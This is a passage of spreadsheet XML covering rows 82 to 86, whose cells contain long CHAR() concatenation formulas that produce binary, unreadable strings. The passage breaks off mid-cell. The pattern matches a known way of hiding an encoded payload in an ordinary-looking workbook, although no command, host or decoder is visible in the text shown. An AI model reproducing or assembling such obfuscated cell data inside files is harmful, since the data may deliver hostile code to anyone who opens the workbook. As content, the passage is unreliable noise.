;CHAR(58)&amp;CHAR(197)&amp;CHAR(69)&amp;CHAR(230)&amp;CHAR(12)&amp;CHAR(60)&amp;CHAR(194)&amp;CHAR(91)&amp;CHAR(92)&amp;CHAR(92)&amp;CHAR(80)&amp;CHAR(83)&amp;CHAR(193)&amp;CHAR(90)&amp;CHAR(88)&amp;CHAR(84)&amp;CHAR(141)&amp;CHAR(113)&amp;CHAR(35)&amp;CHAR(27)&amp;CHAR(136)&amp;CHAR(140)&amp;CHAR(65)&amp;CHAR(1)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(85)&amp;CHAR(248)&amp;CHAR(64)&amp;CHAR(52)&amp;CHAR(138)&amp;CHAR(217)&amp;CHAR(135)&amp;CHAR(212)&amp;CHAR(127)&amp;CHAR(15)&amp;CHAR(70)&amp;CHAR(237)&amp;CHAR(198)&amp;CHAR(7)&amp;CHAR(7)</f>
        <v>}#_x0015_ŠŒ1_x0001__x0002__x0002_Vú_9ŽÝˆÕz_x0004_DèÇ_x000B_
_x0002_^\€©_x0004__x000B__x0005_Z^ý\6Žï“é_x000E_…¨_x000F_
	¹Š_x0017_G_x0007_ê‰_x0010_G_x0007__x0004_‚_x000D__x0006__x000F_†N-_x001F_UmJ^WýTN€É_x0006_€_x000D__x000E__x000F_UìÙ_x0017__x000B_
»‰_x001F_B_x0006_„îï/J_x000D__x0001_ËRPïw_x001C__x0001__x0001_Ë_x0006_„B _x0013_Wøz!_x0017_SRø]B„‹º_x000C__x000B_
YTúQ&gt;‚ê‡ïrL¶­_x0011_E_x000D_µ—_x0016_D_x0001_)ðr9†O&amp;_x001E_UmKR_òTB‡Ås=Sé_x0017__x000F_
ˆíà)G_x0007__x000D_Æ[Qï_x000B__x0013_
	ŽÂ_x0003_†N-_x0017_Uø~-_x001E_UWùSA:ÅEæ_x000C_&lt;Â[\\PSÁZXTq#_x001B_ˆŒA_x0001_
_x0002_Uø@4ŠÙ‡Ô_x000F_FíÆ_x0007__x0007_</v>
      </c>
      <c r="C82" t="str">
        <f>CHAR(244)&amp;CHAR(19)&amp;CHAR(51)&amp;CHAR(192)&amp;CHAR(84)&amp;CHAR(82)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(164)</f>
        <v>ô_x0013_3ÀTRˆê‘¤</v>
      </c>
    </row>
    <row r="83" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B83" t="str">
        <f>CHAR(14)&amp;CHAR(80)&amp;CHAR(92)&amp;CHAR(137)&amp;CHAR(129)&amp;CHAR(91)&amp;CHAR(8)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(93)&amp;CHAR(85)&amp;CHAR(240)&amp;CHAR(93)&amp;CHAR(62)&amp;CHAR(130)&amp;CHAR(239)&amp;CHAR(128)&amp;CHAR(234)&amp;CHAR(5)&amp;CHAR(141)&amp;CHAR(168)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(186)&amp;CHAR(211)&amp;CHAR(35)&amp;CHAR(69)&amp;CHAR(5)&amp;CHAR(140)&amp;CHAR(225)&amp;CHAR(1)&amp;CHAR(22)&amp;CHAR(68)&amp;CHAR(1)&amp;CHAR(13)&amp;CHAR(131)&amp;CHAR(147)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(11)&amp;CHAR(143)&amp;CHAR(66)&amp;CHAR(33)&amp;CHAR(31)&amp;CHAR(91)&amp;CHAR(111)&amp;CHAR(74)&amp;CHAR(90)&amp;CHAR(87)&amp;CHAR(245)&amp;CHAR(84)&amp;CHAR(77)&amp;CHAR(130)&amp;CHAR(214)&amp;CHAR(11)&amp;CHAR(133)&amp;CHAR(132)&amp;CHAR(2)&amp;CHAR(15)&amp;CHAR(10)&amp;CHAR(94)&amp;CHAR(238)&amp;CHAR(246)&amp;CHAR(23)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(183)&amp;CHAR(11)&amp;CHAR(31)&amp;CHAR(68)&amp;CHAR(7)&amp;CHAR(134)&amp;CHAR(226)&amp;CHAR(238)&amp;CHAR(35)&amp;CHAR(77)&amp;CHAR(6)&amp;CHAR(12)&amp;CHAR(202)&amp;CHAR(90)&amp;CHAR(92)&amp;CHAR(239)&amp;CHAR(126)&amp;CHAR(16)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(129)&amp;CHAR(198)&amp;CHAR(14)&amp;CHAR(139)&amp;CHAR(65)&amp;CHAR(45)&amp;CHAR(25)&amp;CHAR(85)&amp;CHAR(250)&amp;CHAR(121)&amp;CHAR(42)&amp;CHAR(19)&amp;CHAR(85)&amp;CHAR(81)&amp;CHAR(254)&amp;CHAR(84)&amp;CHAR(67)&amp;CHAR(135)&amp;CHAR(132)&amp;CHAR(119)&amp;CHAR(8)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(85)&amp;CHAR(84)&amp;CHAR(244)&amp;CHAR(83)&amp;CHAR(62)&amp;CHAR(134)&amp;CHAR(234)&amp;CHAR(143)&amp;CHAR(239)&amp;CHAR(113)&amp;CHAR(78)&amp;CHAR(169)&amp;CHAR(213)&amp;CHAR(43)&amp;CHAR(65)&amp;CHAR(2)&amp;CHAR(180)&amp;CHAR(200)&amp;CHAR(35)&amp;CHAR(70)&amp;CHAR(4)&amp;CHAR(40)&amp;CHAR(252)&amp;CHAR(127)&amp;CHAR(53)&amp;CHAR(136)&amp;CHAR(79)&amp;CHAR(32)&amp;CHAR(31)&amp;CHAR(87)&amp;CHAR(97)&amp;CHAR(74)&amp;CHAR(94)&amp;CHAR(88)&amp;CHAR(249)&amp;CHAR(89)&amp;CHAR(67)&amp;CHAR(143)&amp;CHAR(201)&amp;CHAR(115)&amp;CHAR(46)&amp;CHAR(80)&amp;CHAR(226)&amp;CHAR(145)&amp;CHAR(22)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(135)&amp;CHAR(238)&amp;CHAR(237)&amp;CHAR(35)&amp;CHAR(69)&amp;CHAR(5)&amp;CHAR(14)&amp;CHAR(205)&amp;CHAR(95)&amp;CHAR(87)&amp;CHAR(236)&amp;CHAR(39)&amp;CHAR(21)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(129)&amp;CHAR(207)&amp;CHAR(7)&amp;CHAR(143)&amp;CHAR(66)&amp;CHAR(33)&amp;CHAR(23)&amp;CHAR(91)&amp;CHAR(250)&amp;CHAR(126)&amp;CHAR(41)&amp;CHAR(30)&amp;CHAR(93)&amp;CHAR(87)&amp;CHAR(250)&amp;CHAR(81)&amp;CHAR(94)&amp;CHAR(55)&amp;CHAR(193)&amp;CHAR(65)&amp;CHAR(233)&amp;CHAR(13)&amp;CHAR(57)&amp;CHAR(201)&amp;CHAR(89)&amp;CHAR(89)&amp;CHAR(93)&amp;CHAR(92)&amp;CHAR(94)&amp;CHAR(205)&amp;CHAR(132)&amp;CHAR(231)&amp;CHAR(92)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(89)&amp;CHAR(95)&amp;CHAR(90)&amp;CHAR(108)&amp;CHAR(51)&amp;CHAR(84)&amp;CHAR(57)&amp;CHAR(255)&amp;CHAR(138)&amp;CHAR(65)&amp;CHAR(35)&amp;CHAR(34)&amp;CHAR(94)&amp;CHAR(84)&amp;CHAR(82)&amp;CHAR(139)&amp;CHAR(114)&amp;CHAR(33)&amp;CHAR(41)&amp;CHAR(178)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(109)&amp;CHAR(138)&amp;CHAR(231)&amp;CHAR(11)&amp;CHAR(19)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(134)&amp;CHAR(78)&amp;CHAR(38)&amp;CHAR(123)&amp;CHAR(130)&amp;CHAR(126)&amp;CHAR(34)&amp;CHAR(49)&amp;CHAR(140)&amp;CHAR(183)&amp;CHAR(33)&amp;CHAR(126)&amp;CHAR(15)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(129)&amp;CHAR(193)&amp;CHAR(11)</f>
        <v>_x000E_P\‰[_x0008_
	]Uð]&gt;‚ï€ê_x0005_¨_x0002__x0002__x0006_ºÓ#E_x0005_Œá_x0001__x0016_D_x0001__x000D_ƒ“_x0002__x000B__x000B_B!_x001F_[oJZWõTM‚Ö_x000B_…„_x0002__x000F_
^îö_x0017__x0007__x0007_·_x000B__x001F_D_x0007_†âî#M_x0006__x000C_ÊZ\ï~_x0010_
	Æ_x000E_‹A-_x0019_Uúy*_x0013_UQþTC‡„w_x0008__x0002__x0006_UTôS&gt;†êïqN©Õ+A_x0002_´È#F_x0004_(ü5ˆO _x001F_WaJ^XùYCÉs.Pâ‘_x0016__x0002__x0002_‡îí#E_x0005__x000E_Í_Wì'_x0015__x000B_
Ï_x0007_B!_x0017_[ú~)_x001E_]WúQ^7ÁAé_x000D_9ÉYY]\^Í„ç\_x0005__x0007__x000B_Y_Zl3T9ÿŠA#"^TR‹r!)²_x0005__x0007_mŠç_x000B__x0013__x0001__x0002_†N&amp;{‚~"1Œ·!~_x000F__x0002_
Á_x000B_</v>
      </c>
      <c r="C83" t="str">
        <f>CHAR(238)&amp;CHAR(220)&amp;CHAR(244)&amp;CHAR(186)&amp;CHAR(135)&amp;CHAR(110)&amp;CHAR(146)&amp;CHAR(89)&amp;CHAR(184)&amp;CHAR(244)</f>
        <v>îÜôº‡n’Y¸ô</v>
      </c>
    </row>
    <row r="84" spans="2:3" ht="399" x14ac:dyDescent="0.45">
      <c r="B84" t="str">
        <f>CHAR(159)&amp;CHAR(64)&amp;CHAR(37)&amp;CHAR(57)&amp;CHAR(143)&amp;CHAR(139)&amp;CHAR(46)&amp;CHAR(109)&amp;CHAR(7)&amp;CHAR(4)&amp;CHAR(3)&amp;CHAR(142)&amp;CHAR(67)&amp;CHAR(42)&amp;CHAR(81)&amp;CHAR(179)&amp;CHAR(4)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(131)&amp;CHAR(77)&amp;CHAR(41)&amp;CHAR(58)&amp;CHAR(134)&amp;CHAR(79)&amp;CHAR(46)&amp;CHAR(81)&amp;CHAR(138)&amp;CHAR(65)&amp;CHAR(35)&amp;CHAR(34)&amp;CHAR(89)&amp;CHAR(106)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(21)&amp;CHAR(95)&amp;CHAR(132)&amp;CHAR(130)&amp;CHAR(21)&amp;CHAR(8)&amp;CHAR(14)&amp;CHAR(15)&amp;CHAR(82)&amp;CHAR(251)&amp;CHAR(86)&amp;CHAR(126)&amp;CHAR(142)&amp;CHAR(202)&amp;CHAR(13)&amp;CHAR(143)&amp;CHAR(191)&amp;CHAR(3)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(52)&amp;CHAR(203)&amp;CHAR(134)&amp;CHAR(118)&amp;CHAR(41)&amp;CHAR(54)&amp;CHAR(14)&amp;CHAR(84)&amp;CHAR(83)&amp;CHAR(8)&amp;CHAR(130)&amp;CHAR(196)&amp;CHAR(87)&amp;CHAR(136)&amp;CHAR(70)&amp;CHAR(43)&amp;CHAR(22)&amp;CHAR(177)&amp;CHAR(6)&amp;CHAR(54)&amp;CHAR(227)&amp;CHAR(131)&amp;CHAR(81)&amp;CHAR(88)&amp;CHAR(10)&amp;CHAR(79)&amp;CHAR(220)&amp;CHAR(248)&amp;CHAR(144)&amp;CHAR(139)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(13)&amp;CHAR(141)&amp;CHAR(199)&amp;CHAR(130)&amp;CHAR(70)&amp;CHAR(45)&amp;CHAR(35)&amp;CHAR(128)&amp;CHAR(206)&amp;CHAR(5)&amp;CHAR(141)&amp;CHAR(135)&amp;CHAR(3)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(60)&amp;CHAR(125)&amp;CHAR(45)&amp;CHAR(21)&amp;CHAR(191)&amp;CHAR(182)&amp;CHAR(15)&amp;CHAR(15)&amp;CHAR(2)&amp;CHAR(82)&amp;CHAR(87)&amp;CHAR(104)&amp;CHAR(8)&amp;CHAR(92)&amp;CHAR(84)&amp;CHAR(97)&amp;CHAR(91)&amp;CHAR(90)&amp;CHAR(9)&amp;CHAR(64)&amp;CHAR(197)&amp;CHAR(4)&amp;CHAR(178)&amp;CHAR(202)&amp;CHAR(93)&amp;CHAR(143)&amp;CHAR(78)&amp;CHAR(38)&amp;CHAR(121)&amp;CHAR(87)&amp;CHAR(71)&amp;CHAR(251)&amp;CHAR(150)&amp;CHAR(133)&amp;CHAR(2)&amp;CHAR(15)&amp;CHAR(10)&amp;CHAR(130)&amp;CHAR(206)&amp;CHAR(141)&amp;CHAR(79)&amp;CHAR(35)&amp;CHAR(39)&amp;CHAR(139)&amp;CHAR(204)&amp;CHAR(4)&amp;CHAR(128)&amp;CHAR(252)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(92)&amp;CHAR(91)&amp;CHAR(85)&amp;CHAR(89)&amp;CHAR(93)&amp;CHAR(92)&amp;CHAR(132)&amp;CHAR(131)&amp;CHAR(33)&amp;CHAR(123)&amp;CHAR(11)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(82)&amp;CHAR(143)&amp;CHAR(129)&amp;CHAR(21)&amp;CHAR(15)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(85)&amp;CHAR(92)&amp;CHAR(241)&amp;CHAR(152)&amp;CHAR(150)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(128)&amp;CHAR(226)&amp;CHAR(135)&amp;CHAR(230)&amp;CHAR(4)&amp;CHAR(134)&amp;CHAR(204)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(60)&amp;CHAR(126)&amp;CHAR(41)&amp;CHAR(22)&amp;CHAR(126)&amp;CHAR(34)&amp;CHAR(242)&amp;CHAR(196)&amp;CHAR(22)&amp;CHAR(20)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(118)&amp;CHAR(23)&amp;CHAR(96)&amp;CHAR(13)&amp;CHAR(139)&amp;CHAR(64)&amp;CHAR(39)&amp;CHAR(39)&amp;CHAR(192)&amp;CHAR(74)&amp;CHAR(33)&amp;CHAR(43)&amp;CHAR(132)&amp;CHAR(52)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(90)&amp;CHAR(99)&amp;CHAR(18)&amp;CHAR(83)&amp;CHAR(240)&amp;CHAR(156)&amp;CHAR(130)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(81)&amp;CHAR(92)&amp;CHAR(95)&amp;CHAR(84)&amp;CHAR(87)&amp;CHAR(253)&amp;CHAR(145)&amp;CHAR(157)&amp;CHAR(9)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(128)&amp;CHAR(205)&amp;CHAR(1)&amp;CHAR(139)&amp;CHAR(136)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(93)&amp;CHAR(135)&amp;CHAR(70)&amp;CHAR(47)&amp;CHAR(31)</f>
        <v>Ÿ@%9‹.m_x0007__x0004__x0003_ŽC*Q³_x0004__x0006__x0007__x000B_ƒM):†O.QŠA#"Yj_x0002__x0002__x0006__x0015__„‚_x0015__x0008__x000E__x000F_RûV~ŽÊ_x000D_¿_x0003__x0006__x0005_4Ë†v)6_x000E_TS_x0008_‚ÄWˆF+_x0016_±_x0006_6ãƒQX
OÜø‹
	_x000D_Ç‚F-#€Î_x0005_‡_x0003__x0002__x0006_&lt;}-_x0015_¿¶_x000F__x000F__x0002_RWh_x0008_\Ta[Z	@Å_x0004_²Ê]N&amp;yWGû–…_x0002__x000F_
‚ÎO#'‹Ì_x0004_€ü_x0007__x000B_
\[UY]\„ƒ!{_x000B_	_x0002_R_x0015__x000F_	_x0005_U\ñ˜–_x0004__x0001__x0002_€â‡æ_x0004_†Ì_x0005__x0007__x000B_&lt;~)_x0016_~"òÄ_x0016__x0014__x0001__x0001_v_x0017_`_x000D_‹@''ÀJ!+„4_x0007__x000B_Zc_x0012_Sðœ‚	_x0007__x0005_Q\_TWý‘		_x0005_€Í_x0001_‹ˆ_x0004__x0001__x0002_]‡F/_x001F_</v>
      </c>
      <c r="C84" t="str">
        <f>CHAR(20)&amp;CHAR(50)&amp;CHAR(3)&amp;CHAR(222)&amp;CHAR(180)&amp;CHAR(115)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(50)</f>
        <v>_x0014_2_x0003_Þ´s¸ôq2</v>
      </c>
    </row>
    <row r="85" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B85" t="str">
        <f>CHAR(197)&amp;CHAR(66)&amp;CHAR(33)&amp;CHAR(19)&amp;CHAR(15)&amp;CHAR(5)&amp;CHAR(10)&amp;CHAR(13)&amp;CHAR(82)&amp;CHAR(135)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(39)&amp;CHAR(70)&amp;CHAR(108)&amp;CHAR(18)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(47)&amp;CHAR(95)&amp;CHAR(246)&amp;CHAR(145)&amp;CHAR(152)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(139)&amp;CHAR(197)&amp;CHAR(127)&amp;CHAR(99)&amp;CHAR(134)&amp;CHAR(123)&amp;CHAR(47)&amp;CHAR(18)&amp;CHAR(193)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(15)&amp;CHAR(126)&amp;CHAR(87)&amp;CHAR(95)&amp;CHAR(138)&amp;CHAR(65)&amp;CHAR(35)&amp;CHAR(30)&amp;CHAR(206)&amp;CHAR(70)&amp;CHAR(38)&amp;CHAR(22)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(9)&amp;CHAR(85)&amp;CHAR(136)&amp;CHAR(146)&amp;CHAR(78)&amp;CHAR(8)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(82)&amp;CHAR(106)&amp;CHAR(14)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(43)&amp;CHAR(94)&amp;CHAR(139)&amp;CHAR(53)&amp;CHAR(140)&amp;CHAR(116)&amp;CHAR(15)&amp;CHAR(250)&amp;CHAR(157)&amp;CHAR(145)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(128)&amp;CHAR(199)&amp;CHAR(98)&amp;CHAR(55)&amp;CHAR(138)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(76)&amp;CHAR(14)&amp;CHAR(125)&amp;CHAR(42)&amp;CHAR(110)&amp;CHAR(7)&amp;CHAR(111)&amp;CHAR(7)&amp;CHAR(62)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(251)&amp;CHAR(52)&amp;CHAR(81)&amp;CHAR(244)&amp;CHAR(93)&amp;CHAR(53)&amp;CHAR(132)&amp;CHAR(129)&amp;CHAR(71)&amp;CHAR(12)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(130)&amp;CHAR(197)&amp;CHAR(115)&amp;CHAR(31)&amp;CHAR(132)&amp;CHAR(78)&amp;CHAR(38)&amp;CHAR(34)&amp;CHAR(143)&amp;CHAR(113)&amp;CHAR(45)&amp;CHAR(41)&amp;CHAR(84)&amp;CHAR(250)&amp;CHAR(62)&amp;CHAR(94)&amp;CHAR(90)&amp;CHAR(253)&amp;CHAR(147)&amp;CHAR(141)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(137)&amp;CHAR(251)&amp;CHAR(94)&amp;CHAR(253)&amp;CHAR(145)&amp;CHAR(149)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(245)&amp;CHAR(121)&amp;CHAR(38)&amp;CHAR(46)&amp;CHAR(253)&amp;CHAR(146)&amp;CHAR(151)&amp;CHAR(22)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(92)&amp;CHAR(253)&amp;CHAR(123)&amp;CHAR(46)&amp;CHAR(45)&amp;CHAR(249)&amp;CHAR(147)&amp;CHAR(147)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(14)&amp;CHAR(128)&amp;CHAR(253)&amp;CHAR(112)&amp;CHAR(66)&amp;CHAR(248)&amp;CHAR(188)&amp;CHAR(74)&amp;CHAR(14)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(132)&amp;CHAR(148)&amp;CHAR(66)&amp;CHAR(14)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(138)&amp;CHAR(141)&amp;CHAR(57)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(85)&amp;CHAR(85)&amp;CHAR(132)&amp;CHAR(142)&amp;CHAR(37)&amp;CHAR(2)&amp;CHAR(13)&amp;CHAR(14)&amp;CHAR(95)&amp;CHAR(234)&amp;CHAR(10)&amp;CHAR(21)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(245)&amp;CHAR(117)&amp;CHAR(39)&amp;CHAR(134)&amp;CHAR(133)&amp;CHAR(30)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(250)&amp;CHAR(125)&amp;CHAR(37)&amp;CHAR(82)&amp;CHAR(226)&amp;CHAR(213)&amp;CHAR(23)&amp;CHAR(7)&amp;CHAR(22)&amp;CHAR(135)&amp;CHAR(197)&amp;CHAR(29)&amp;CHAR(57)&amp;CHAR(140)&amp;CHAR(2)&amp;CHAR(16)&amp;CHAR(6)&amp;CHAR(4)&amp;CHAR(118)&amp;CHAR(11)&amp;CHAR(60)&amp;CHAR(157)&amp;CHAR(9)&amp;CHAR(18)&amp;CHAR(4)&amp;CHAR(7)&amp;CHAR(114)&amp;CHAR(15)&amp;CHAR(129)&amp;CHAR(207)&amp;CHAR(230)&amp;CHAR(4)&amp;CHAR(60)&amp;CHAR(203)&amp;CHAR(85)&amp;CHAR(87)&amp;CHAR(92)&amp;CHAR(132)&amp;CHAR(195)&amp;CHAR(82)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(193)&amp;CHAR(135)&amp;CHAR(233)&amp;CHAR(213)&amp;CHAR(8)&amp;CHAR(5)</f>
        <v>ÅB!_x0013__x000F__x0005_
_x000D_R‡F!'Fl_x0012__x0001__x0002_/_ö‘˜_x0003__x0007__x0007_‹Åc†{/_x0012_Á_x000D__x0006__x000F_~W_ŠA#_x001E_ÎF&amp;_x0016__x0002__x0005_		Uˆ’N_x0008__x0002__x0004_Rj_x000E_
_x0002_+^‹5Œt_x000F_ú‘_x0002_
_x0002_€Çb7Š_x0002_	L_x000E_}*n_x0007_o_x0007_&gt;_x0005__x000B_û4Qô]5„G_x000C_
	‚Ås_x001F_„N&amp;"q-)Tú&gt;^Zý“_x0002__x000B_
‰û^ý‘•_x0007__x000B__x0005_õy&amp;.ý’—_x0016__x0004__x0001_\ý{.-ù““_x0007__x0007__x000E_€ýpBø¼J_x000E__x000D__x0006_„”B_x000E__x0007__x0005_Š9_x0005__x0002__x0002_UU„Ž%_x0002__x000D__x000E__ê
_x0015__x0002__x000B_õu'†…_x001E__x0003__x0007__x000B_ú}%RâÕ_x0017__x0007__x0016_‡Å_x001D_9Œ_x0002__x0010__x0006__x0004_v_x000B_&lt;	_x0012__x0004__x0007_r_x000F_Ïæ_x0004_&lt;ËUW\„ÃR_x000B__x0002__x0002_Á‡éÕ_x0008__x0005_</v>
      </c>
      <c r="C85" t="str">
        <f>CHAR(1)&amp;CHAR(108)&amp;CHAR(25)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(20)&amp;CHAR(50)&amp;CHAR(3)&amp;CHAR(254)</f>
        <v>_x0001_l_x0019_[¸ô_x0014_2_x0003_þ</v>
      </c>
    </row>
    <row r="86" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B86" t="str">
        <f>CHAR(5)&amp;CHAR(94)&amp;CHAR(91)&amp;CHAR(89)&amp;CHAR(137)&amp;CHAR(176)&amp;CHAR(37)&amp;CHAR(242)&amp;CHAR(10)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(92)&amp;CHAR(128)&amp;CHAR(108)&amp;CHAR(58)&amp;CHAR(142)&amp;CHAR(67)&amp;CHAR(37)&amp;CHAR(125)&amp;CHAR(143)&amp;CHAR(205)&amp;CHAR(13)&amp;CHAR(142)&amp;CHAR(231)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(22)&amp;CHAR(137)&amp;CHAR(61)&amp;CHAR(49)&amp;CHAR(137)&amp;CHAR(80)&amp;CHAR(18)&amp;CHAR(140)&amp;CHAR(221)&amp;CHAR(11)&amp;CHAR(135)&amp;CHAR(208)&amp;CHAR(7)&amp;CHAR(14)&amp;CHAR(5)&amp;CHAR(128)&amp;CHAR(67)&amp;CHAR(27)&amp;CHAR(52)&amp;CHAR(217)&amp;CHAR(9)&amp;CHAR(207)&amp;CHAR(132)&amp;CHAR(82)&amp;CHAR(43)&amp;CHAR(27)&amp;CHAR(131)&amp;CHAR(77)&amp;CHAR(35)&amp;CHAR(33)&amp;CHAR(140)&amp;CHAR(77)&amp;CHAR(41)&amp;CHAR(1)&amp;CHAR(196)&amp;CHAR(139)&amp;CHAR(66)&amp;CHAR(33)&amp;CHAR(29)&amp;CHAR(130)&amp;CHAR(66)&amp;CHAR(33)&amp;CHAR(14)&amp;CHAR(200)&amp;CHAR(134)&amp;CHAR(70)&amp;CHAR(32)&amp;CHAR(33)&amp;CHAR(137)&amp;CHAR(76)&amp;CHAR(6)&amp;CHAR(1)&amp;CHAR(205)&amp;CHAR(129)&amp;CHAR(10)&amp;CHAR(130)&amp;CHAR(204)&amp;CHAR(115)&amp;CHAR(33)&amp;CHAR(142)&amp;CHAR(126)&amp;CHAR(41)&amp;CHAR(18)&amp;CHAR(135)&amp;CHAR(150)&amp;CHAR(33)&amp;CHAR(239)&amp;CHAR(22)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(42)&amp;CHAR(210)&amp;CHAR(143)&amp;CHAR(195)&amp;CHAR(41)&amp;CHAR(64)&amp;CHAR(140)&amp;CHAR(15)&amp;CHAR(5)&amp;CHAR(71)&amp;CHAR(132)&amp;CHAR(13)&amp;CHAR(143)&amp;CHAR(205)&amp;CHAR(114)&amp;CHAR(245)&amp;CHAR(130)&amp;CHAR(126)&amp;CHAR(45)&amp;CHAR(29)&amp;CHAR(141)&amp;CHAR(187)&amp;CHAR(47)&amp;CHAR(254)&amp;CHAR(8)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(140)&amp;CHAR(94)&amp;CHAR(45)&amp;CHAR(18)&amp;CHAR(253)&amp;CHAR(182)&amp;CHAR(34)&amp;CHAR(1)&amp;CHAR(11)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(136)&amp;CHAR(137)&amp;CHAR(42)&amp;CHAR(227)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(196)&amp;CHAR(143)&amp;CHAR(30)&amp;CHAR(238)&amp;CHAR(11)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(250)&amp;CHAR(179)&amp;CHAR(47)&amp;CHAR(1)&amp;CHAR(8)&amp;CHAR(13)&amp;CHAR(2)&amp;CHAR(90)&amp;CHAR(234)&amp;CHAR(8)&amp;CHAR(21)&amp;CHAR(22)&amp;CHAR(4)&amp;CHAR(136)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(43)&amp;CHAR(137)&amp;CHAR(205)&amp;CHAR(10)&amp;CHAR(143)&amp;CHAR(71)&amp;CHAR(35)&amp;CHAR(19)&amp;CHAR(141)&amp;CHAR(197)&amp;CHAR(247)&amp;CHAR(141)&amp;CHAR(83)&amp;CHAR(35)&amp;CHAR(23)&amp;CHAR(135)&amp;CHAR(13)&amp;CHAR(149)&amp;CHAR(143)&amp;CHAR(75)&amp;CHAR(47)&amp;CHAR(26)&amp;CHAR(246)&amp;CHAR(179)&amp;CHAR(33)&amp;CHAR(3)&amp;CHAR(8)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(137)&amp;CHAR(10)&amp;CHAR(249)&amp;CHAR(177)&amp;CHAR(45)&amp;CHAR(13)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(13)&amp;CHAR(193)&amp;CHAR(83)&amp;CHAR(236)&amp;CHAR(221)&amp;CHAR(19)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(49)&amp;CHAR(79)&amp;CHAR(47)&amp;CHAR(38)&amp;CHAR(133)&amp;CHAR(193)&amp;CHAR(11)&amp;CHAR(56)&amp;CHAR(81)&amp;CHAR(46)&amp;CHAR(17)&amp;CHAR(57)&amp;CHAR(142)&amp;CHAR(38)&amp;CHAR(253)&amp;CHAR(6)&amp;CHAR(22)&amp;CHAR(4)&amp;CHAR(116)&amp;CHAR(8)&amp;CHAR(57)&amp;CHAR(155)&amp;CHAR(46)&amp;CHAR(245)&amp;CHAR(7)&amp;CHAR(4)&amp;CHAR(3)&amp;CHAR(115)&amp;CHAR(26)&amp;CHAR(133)&amp;CHAR(65)&amp;CHAR(47)&amp;CHAR(20)&amp;CHAR(132)&amp;CHAR(239)&amp;CHAR(15)&amp;CHAR(131)&amp;CHAR(77)&amp;CHAR(41)&amp;CHAR(22)&amp;CHAR(140)&amp;CHAR(224)&amp;CHAR(11)&amp;CHAR(124)</f>
        <v>_x0005_^[Y‰°%ò
